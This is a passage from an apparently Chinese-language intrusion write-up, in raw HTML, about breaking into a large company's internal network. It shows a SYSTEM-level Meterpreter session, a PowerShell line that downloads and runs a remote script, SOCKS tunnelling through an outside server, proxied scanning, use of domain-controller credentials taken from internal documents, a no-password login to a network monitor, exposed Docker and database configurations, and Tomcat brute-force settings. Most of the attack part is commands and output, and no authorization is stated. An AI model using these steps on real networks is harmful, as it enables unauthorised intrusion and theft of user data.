</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">14
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">15
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">16
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">17
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-gdscript3 data-lang=gdscript3><span style=display:flex><span>meterpreter <span style=color:#f92672>&gt;</span> load powershell 
</span></span><span style=display:flex><span>Loading extension powershell<span style=color:#f92672>...</span>Success<span style=color:#f92672>.</span>
</span></span><span style=display:flex><span>meterpreter <span style=color:#f92672>&gt;</span> powershell_shell
</span></span><span style=display:flex><span>PS <span style=color:#f92672>&gt;</span> whoami
</span></span><span style=display:flex><span>nt authority\system
</span></span><span style=display:flex><span>PS <span style=color:#f92672>&gt;</span> IEX(New<span style=color:#f92672>-</span><span style=color:#a6e22e>Object</span> Net<span style=color:#f92672>.</span>WebClient)<span style=color:#f92672>.</span>DownloadString(<span style=color:#e6db74>&#34;https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/Invoke-Portscan.ps1&#34;</span>);
</span></span><span style=display:flex><span>PS <span style=color:#f92672>&gt;</span> Invoke<span style=color:#f92672>-</span>Portscan <span style=color:#f92672>-</span>Hosts <span style=color:#ae81ff>10.159</span><span style=color:#f92672>.</span><span style=color:#ae81ff>63.2</span> <span style=color:#f92672>-</span>Ports <span style=color:#e6db74>&#34;21&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Hostname      : <span style=color:#ae81ff>10.159</span><span style=color:#f92672>.</span><span style=color:#ae81ff>63.2</span>
</span></span><span style=display:flex><span>alive         : True
</span></span><span style=display:flex><span>openPorts     : {<span style=color:#ae81ff>21</span>}
</span></span><span style=display:flex><span>closedPorts   : {}
</span></span><span style=display:flex><span>filteredPorts : {}
</span></span><span style=display:flex><span>finishTime    : <span style=color:#ae81ff>2017</span><span style=color:#f92672>/</span><span style=color:#ae81ff>12</span><span style=color:#f92672>/</span><span style=color:#ae81ff>28</span> <span style=color:#ae81ff>17</span>:<span style=color:#ae81ff>19</span>:<span style=color:#ae81ff>46</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>.....</span>
</span></span></code></pre></td></tr></table></div></div><p>第二种办法：(先通过其他模块下载)</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">14
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-gdscript3 data-lang=gdscript3><span style=display:flex><span>meterpreter <span style=color:#f92672>&gt;</span> run post<span style=color:#f92672>/</span>windows<span style=color:#f92672>/</span>manage<span style=color:#f92672>/</span>download_exec URL<span style=color:#f92672>=</span>https:<span style=color:#f92672>//</span>raw<span style=color:#f92672>.</span>githubusercontent<span style=color:#f92672>.</span>com<span style=color:#f92672>/</span>PowerShellMafia<span style=color:#f92672>/</span>PowerSploit<span style=color:#f92672>/</span>master<span style=color:#f92672>/</span>Recon<span style=color:#f92672>/</span>Invoke<span style=color:#f92672>-</span>Portscan<span style=color:#f92672>.</span>ps1
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>[<span style=color:#f92672>*</span>] <span style=color:#ae81ff>41534</span> bytes downloaded to C:\Windows\TEMP\Invoke<span style=color:#f92672>-</span>Portscan<span style=color:#f92672>.</span>ps1 <span style=color:#f92672>in</span> <span style=color:#ae81ff>1</span> seconds 
</span></span><span style=display:flex><span>meterpreter <span style=color:#f92672>&gt;</span> powershell_shell 
</span></span><span style=display:flex><span>PS <span style=color:#f92672>&gt;</span> C:\Windows\TEMP\Invoke<span style=color:#f92672>-</span>Portscan<span style=color:#f92672>.</span>ps1
</span></span><span style=display:flex><span>PS <span style=color:#f92672>&gt;</span> Invoke<span style=color:#f92672>-</span>Portscan <span style=color:#f92672>-</span>Hosts <span style=color:#ae81ff>10.159</span><span style=color:#f92672>.</span><span style=color:#ae81ff>63.5</span> <span style=color:#f92672>-</span>Ports <span style=color:#e6db74>&#34;22&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Hostname      : <span style=color:#ae81ff>10.159</span><span style=color:#f92672>.</span><span style=color:#ae81ff>63.5</span>
</span></span><span style=display:flex><span>alive         : True
</span></span><span style=display:flex><span>openPorts     : {<span style=color:#ae81ff>22</span>}
</span></span><span style=display:flex><span>closedPorts   : {}
</span></span><span style=display:flex><span>filteredPorts : {}
</span></span><span style=display:flex><span>finishTime    : <span style=color:#ae81ff>2017</span><span style=color:#f92672>/</span><span style=color:#ae81ff>12</span><span style=color:#f92672>/</span><span style=color:#ae81ff>28</span> <span style=color:#ae81ff>17</span>:<span style=color:#ae81ff>23</span>:<span style=color:#ae81ff>45</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=0x07-再一次克服困难>0x07 再一次克服困难</h2><p>之前的方案是使用<code>Portfwd</code>，但是效果太差了，当数据流过大，会将Meterpreter冲掉，并且每次数据回送都不完整。</p><p>这次采用Socks5打洞，我利用了外网的服务器，开设一个Socks代理端口，将流量转发到目标内网</p><p>外网服务器：</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>root@iZm5e***1ga7bq07Z:~# ./ew_for_linux64 -s rcsocks -l 1080 -e 888 &amp;
</span></span></code></pre></td></tr></table></div></div><p>内网主机：</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>ew_for_Win.exe -s rssocks -d [服务器IP] -e 888
</span></span></code></pre></td></tr></table></div></div><blockquote><p>ew下载地址： <a href=http://rootkiter.com/EarthWorm/>http://rootkiter.com/EarthWorm/</a></p></blockquote><p>现在在浏览器中设置一下Socks5代理即可访问内网，很稳定</p><p><img src=https://images.payloads.online/ef9995b8-4f5e-11ec-9e7b-00d861bf4abb.png alt=设置代理></p><p><img src=https://images.payloads.online/ef54dd42-4f5e-11ec-84cd-00d861bf4abb.png alt=打洞成功></p><h2 id=0x08-开始扫描>0x08 开始扫描</h2><p>一开始我使用PowerSploit扫描，但是需要等待Meterpreter将数据取回，这样就占用了一个session，搜集了部分信息后，决定采用Nmap</p><p>由于我的操作系统是黑苹果，需要安装proxychains-ng</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>brew install proxychains-ng
</span></span></code></pre></td></tr></table></div></div><p>程序安装在：<code>/usr/local/Cellar/proxychains-ng/4.12_1/bin/proxychains4</code></p><p>配置文件：<code>/usr/local/etc/proxychains.conf</code></p><p>添加一条Socks5代理：</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>#Examples:
</span></span><span style=display:flex><span>#
</span></span><span style=display:flex><span>#       socks5  192.168.67.78   1080    lamer   secret
</span></span><span style=display:flex><span>#       http    192.168.89.3    8080    justu   hidden
</span></span><span style=display:flex><span>#       socks4  192.168.1.49    1080
</span></span><span style=display:flex><span>#       http    192.168.39.93   8080  
</span></span><span style=display:flex><span>[ProxyList]
</span></span><span style=display:flex><span># add proxy here ...
</span></span><span style=display:flex><span># meanwile
</span></span><span style=display:flex><span># defaults set to &#34;tor&#34;
</span></span><span style=display:flex><span>socks5  ***.***.***.*** 1080
</span></span></code></pre></td></tr></table></div></div><p>开始扫描：</p><p><img src=https://images.payloads.online/f01e8b7e-4f5e-11ec-a1d4-00d861bf4abb.png alt=扫描></p><h2 id=0x09-信息搜集基本结果>0x09 信息搜集基本结果</h2><p>通过端口扫描以及HTTP服务的爬行，发现一些运维人员开放的共享，和一些MS17010漏洞的Windows服务器，但是没有选择直接去打，觉得信息搜集的不够全面</p><p>在内网中收获最大的就是搜集到了运维人员用于共享系统镜像、工具的Web服务器：</p><p><img src=https://images.payloads.online/f05f8aca-4f5e-11ec-ba8f-00d861bf4abb.png alt=运维人员的服务器></p><p>发现基线检查的文档，下载了一两个，开始通过搜集的信息进行内网结构画像：</p><p><img src=https://images.payloads.online/f0e9cf46-4f5e-11ec-8881-00d861bf4abb.png alt=基线检查></p><p><img src=https://images.payloads.online/f0aa9f42-4f5e-11ec-8568-00d861bf4abb.png alt=内网结构></p><h3 id=轻松获得域控服务器>轻松获得域控服务器</h3><p><img src=https://images.payloads.online/f12dd0c4-4f5e-11ec-8057-00d861bf4abb.png alt=域控></p><p>从文档中搜集信息如下：</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">14
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">15
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">16
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">17
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">18
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">19
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">20
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">21
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">22
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">23
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">24
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">25
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">26
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">27
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>密码：*****@*****! *****
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>administrator密码：***** # 后面尝试了登录这个，不行
</span></span><span style=display:flex><span>IP地址：10.159.16.2
</span></span><span style=display:flex><span>掩码：255.255.255.128
</span></span><span style=display:flex><span>网关：10.159.16.1
</span></span><span style=display:flex><span>域名称：*****.com
</span></span><span style=display:flex><span>域用户：***** 、 *****密码*****
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>计算机名：
</span></span><span style=display:flex><span>所在域名或工作组名称：*****.com
</span></span><span style=display:flex><span>IP地址：10.159.16.2
</span></span><span style=display:flex><span>掩码：255.255.255.128
</span></span><span style=display:flex><span>网关：10.159.16.1
</span></span><span style=display:flex><span>操作系统：Windows Server2008 R2企业版
</span></span><span style=display:flex><span>服务器1—群集节点A
</span></span><span style=display:flex><span>计算机名：nascluster1
</span></span><span style=display:flex><span>所在域名或工作组名称：*****.com
</span></span><span style=display:flex><span>IP地址1：10.159.16.3
</span></span><span style=display:flex><span>IP地址2：192.168.10.3
</span></span><span style=display:flex><span>操作系统：Windows Server 2012
</span></span><span style=display:flex><span>服务器2—群集节点B
</span></span><span style=display:flex><span>计算机名：nascluster2
</span></span><span style=display:flex><span>所在域名或工作组名称：*****.com
</span></span><span style=display:flex><span>IP地址1：10.159.16.4
</span></span><span style=display:flex><span>IP地址2：192.168.10.4
</span></span><span style=display:flex><span>操作系统：Windows Server 2012
</span></span></code></pre></td></tr></table></div></div><p>根据之前搜集的子网来判断，我们所处于的内网中有很多域。并且能够可以和域控服务器通信，即使当前的服务器不在域中，也可以进行登录</p><p><img src=https://images.payloads.online/f16d5668-4f5e-11ec-951e-00d861bf4abb.png alt=域控3389></p><p>通过两层转发，我们尝试登录：</p><ul><li>一层是公司路由</li><li>一层是LCX</li></ul><p><img src=https://images.payloads.online/f1afeaaa-4f5e-11ec-a78a-00d861bf4abb.jpg alt=登录域控></p><p>当时登录上去并没有做过多的操作，简单看看就下来了，因为这个内网很大，后面的发现令我倒吸凉气</p><h2 id=0x10-内网核心>0x10 内网核心</h2><p>Orion</p><p>这是一款完善的网络带宽、性能和故障管理软件。使用它用户可以通过自己的浏览器即时监控自己的网络状态和统计资料。程序将监视和搜集来自路由、节点、服务器和所有开启SNMP服务的设备信息；同时也将监控本机的CPU占用率、内存使用情况以及可用磁盘空间。</p><p><img src=https://images.payloads.online/f1f70944-4f5e-11ec-9f5d-00d861bf4abb.png alt=Orion></p><p>通过空口令进入</p><p><img src=https://images.payloads.online/f231d7fe-4f5e-11ec-bb53-00d861bf4abb.png alt=Orion></p><p>通过查看别名发现这些设备是企业的核心路由、防火墙、交换机</p><ul><li>官网防火墙</li><li>管理员交换机（专线）</li><li>内网核心交换机 x 2</li><li>外网核心交换机 x 2</li><li>公网接入交换机 x 2</li><li>回源 （这个不太清楚）</li></ul><p>基本上都是50个口以上</p><p>通过之前的自动搜集的路由来看：</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">7
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>[*] AutoAddRoute: Routing new subnet 10.0.0.0/255.0.0.0 through session 9
</span></span><span style=display:flex><span>[*] AutoAddRoute: Routing new subnet 10.159.0.0/255.255.128.0 through session 9
</span></span><span style=display:flex><span>[*] AutoAddRoute: Routing new subnet 10.159.63.128/255.255.255.128 through session 9
</span></span><span style=display:flex><span>[*] AutoAddRoute: Routing new subnet 10.159.128.0/255.255.128.0 through session 9
</span></span><span style=display:flex><span>[*] AutoAddRoute: Routing new subnet 10.159.191.128/255.255.255.128 through session 9
</span></span><span style=display:flex><span>[*] AutoAddRoute: Routing new subnet 169.254.0.0/255.255.0.0 through session 9
</span></span><span style=display:flex><span>[*] AutoAddRoute: Routing new subnet 192.168.0.0/255.255.0.0 through session 9
</span></span></code></pre></td></tr></table></div></div><p>10.0.0.0 是可以访问整个超大的内网，在搜集其他网段信息的时候，不泛发现其他大企业的漏洞、大多是配置不得当。</p><h2 id=0x12-配置引发的隐患>0x12 配置引发的隐患</h2><p><img src=https://images.payloads.online/f27348c4-4f5e-11ec-b671-00d861bf4abb.png alt=一些配置文件></p><p><img src=https://images.payloads.online/f2b2c738-4f5e-11ec-a432-00d861bf4abb.png alt=一些配置文件></p><p>还有未做权限验证的Docker集群管理平台：</p><p><img src=https://images.payloads.online/f2f5c5ce-4f5e-11ec-8b1d-00d861bf4abb.png alt=Docker></p><p>有多个实例，分别用于对外的服务</p><p>搜集到用户中心的数据库配置，也就是说泄漏了所有用户的数据了，这可是一个大厂。</p><p><img src=https://images.payloads.online/f33d9e9e-4f5e-11ec-9a04-00d861bf4abb.png alt=数据库></p><p>其次一些网段基本上都安装了<code>tomcat</code>，通过socks5代理，进行爆破，流量不走Meterpreter，因为会掉线</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">14
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">15
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">16
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">17
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">18
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">19
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">20
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">21
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">22
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">23
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">24
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">25
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">26
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>msf auxiliary(tomcat_mgr_login) &gt; show options 
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Module options (auxiliary/scanner/http/tomcat_mgr_login):
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>   Name              Current Setting                                                                              Required  Description
</span></span><span style=display:flex><span>   ----              ---------------                                                                              --------  -----------
</span></span><span style=display:flex><span>   BLANK_PASSWORDS   false                                                                                        no        Try blank passwords for all users
</span></span><span style=display:flex><span>   BRUTEFORCE_SPEED  5                                                                                            yes       How fast to bruteforce, from 0 to 5
</span></span><span style=display:flex><span>   DB_ALL_CREDS      false                                                                                        no        Try each user/password couple stored in the current database
</span></span><span style=display:flex><span>   DB_ALL_PASS       false                                                                                        no        Add all passwords in the current database to the list
</span></span><span style=display:flex><span>   DB_ALL_USERS      false                                                                                        no        Add all users in the current database to the list
</span></span><span style=display:flex><span>   PASSWORD                                                                                                       no        The HTTP password to specify for authentication
